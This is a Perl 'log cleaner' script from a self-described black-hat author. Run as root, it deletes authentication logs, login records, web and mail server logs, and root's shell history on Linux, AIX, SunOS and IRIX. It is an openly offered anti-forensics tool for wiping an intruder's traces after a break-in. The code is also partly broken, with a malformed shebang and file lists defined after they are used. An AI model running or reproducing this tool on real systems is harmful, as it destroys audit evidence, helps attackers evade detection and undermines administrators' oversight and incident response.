#!usr/bin/perl -w #Warnings enabled! 
#Log cleaner version Public 
#Give Credits Where Needed - Kouros! 
#This took time, Hope you fucking use it :D 
#Report bugs to info@Kouros-bl4ckhat.com 
#NOTE - YOU MUST BE ROOT! 
print qq^ 
############################ 
#  Log Cleaner 3.0 PUBLIC              # 
#                  Kouros                            # 
#                                                          # 
#  Virangar Security Team              # 
# http://www.Kouros-bl4ckhat.com   # 
############################ 
^; 
while(1) { 
  print "Enter Which OS: "; #User Input 
  chomp($os = <STDIN>); #Takes it into memory 
    
                
          if($os eq "help"){ 
          print "[+]Enter Your OS! Choose from 'linux', 'aix', 'sunos', 'irix'\n"; 
          print "[+]Hit enter with OS, Let the script do its work\n"; 
          print "[+]Note: You MUST Be Root!\n"; 
          print "[+]Contact Info[at]Kouros-bl4ckhat [dot] Com"; 
          print "[+]For Bug finds... Have Fun!\n"; 
          print "[+] - Kouros"; 
          }          
            
             if($os eq "linux"){ #If linux typed, do the following and start brackets 
      foreach my $logphile(@linux) { 
                   unlink($logphile) || print "[-]Fucked up: \"$logphile\" : $!\n"; 
             } 
             } elsif($os eq "sunos"){ #If sunos typed, do the following and start brackets 
           foreach my $logphile(@sunos) { 
                    unlink($logphile) || print "[-] Fucked up: \"$logphile\" : $!\n"; 
              } 
              } elsif($os eq "aix"){ #If aix typed, do the following and start brackets 
           foreach my $logphile(@aix) { 
         unlink($logphile) || print "[-] Fucked up: \"$logphile\" : $!\n"; 
              } 
              } elsif($os eq "irix"){ #If irix typed, do the following and start bracket 
            foreach my $logphile(@irix) { 
                    unlink($logphile) || print "[-] Fucked up: \"$logphile\" : $!\n"; 
              } 

              } else { print"Umm WTF !?\n"; } 
          
          
            
                              #Logs of Irix Systems 

   { #Start Irix Bracket 
    @irix = ("/var/adm/SYSLOG", "/var/adm/sulog", "/var/adm/utmp", "/var/adm/utmpx", 
           "/var/adm/wtmp", "/var/adm/wtmpx", "/var/adm/lastlog/", 
         "/usr/spool/lp/log", "/var/adm/lp/lp-errs", "/usr/lib/cron/log", 
         "/var/adm/loginlog", "/var/adm/pacct", "/var/adm/dtmp", 
         "/var/adm/acct/sum/loginlog", "var/adm/X0msgs", "/var/adm/crash/vmcore", 
         "/var/adm/crash/unix") #End Array 
        } #End Irix Bracket 
                             #Log sof Aix Systems 
   {   #Start Aix Bracket 
   @aix = ("/var/adm/pacct", "/var/adm/wtmp", "/var/adm/dtmp", "/var/adm/qacct",    
            "/var/adm/sulog", "/var/adm/ras/errlog", "/var/adm/ras/bootlog", 
            "/var/adm/cron/log", "/etc/utmp", "/etc/security/lastlog", 
            "/etc/security/failedlogin", "usr/spool/mqueue/syslog")   #End Array    
      }   #End Aix Bracket 
                             #Logs of SunOS Systems    
   {   #Start SunOS Bracket                      
   @sunos = ("/var/adm/messages", "/var/adm/aculogs", "/var/adm/aculog", 
              "/var/adm/sulog", "/var/adm/vold.log", "/var/adm/wtmp", 
              "/var/adm/wtmpx", "/var/adm/utmp", "/var/adm/utmpx", 
              "/var/adm/log/asppp.log", "/var/log/syslog", 
              "/var/log/POPlog", "/var/log/authlog", "/var/adm/pacct", 
              "/var/lp/logs/lpsched", "/var/lp/logs/requests", 
           "/var/cron/logs", "/var/saf/_log", "/var/saf/port/log") #End Array 
      } #End Sunos bracket    
                             #Logs of Linux Systems      
   {   #Start Linux Bracket    
    @linux = ("/var/log/lastlog", "/var/log/telnetd", "/var/run/utmp", 
              "/var/log/secure","/root/.ksh_history", "/root/.bash_history", 
              "/root/.bash_logut", "/var/log/wtmp", "/etc/wtmp", 
              "/var/run/utmp", "/etc/utmp", "/var/log", "/var/adm", 
              "/var/apache/log", "/var/apache/logs", "/usr/local/apache/logs", 
              "/usr/local/apache/logs", "/var/log/acct", "/var/log/xferlog", 
              "/var/log/messages/", "/var/log/proftpd/xferlog.legacy", 
              "/var/log/proftpd.xferlog", "/var/log/proftpd.access_log", 
              "/var/log/httpd/error_log", "/var/log/httpsd/ssl_log", 
              "/var/log/httpsd/ssl.access_log", "/etc/mail/access", 
              "/var/log/qmail", "/var/log/smtpd", "/var/log/samba", 
              "/var/log/samba.log.%m", "/var/lock/samba", "/root/.Xauthority", 
              "/var/log/poplog", "/var/log/news.all", "/var/log/spooler", 
              "/var/log/news", "/var/log/news/news", "/var/log/news/news.all", 
              "/var/log/news/news.crit", "/var/log/news/news.err", "/var/log/news/news.notice", 
              "/var/log/news/suck.err", "/var/log/news/suck.notice", 
              "/var/spool/tmp", "/var/spool/errors", "/var/spool/logs", "/var/spool/locks", 
              "/usr/local/www/logs/thttpd_log", "/var/log/thttpd_log", 
              "/var/log/ncftpd/misclog.txt", "/var/log/nctfpd.errs", 
              "/var/log/auth") #End array 
      } #End linux bracket 
      
   } #Ends Loop  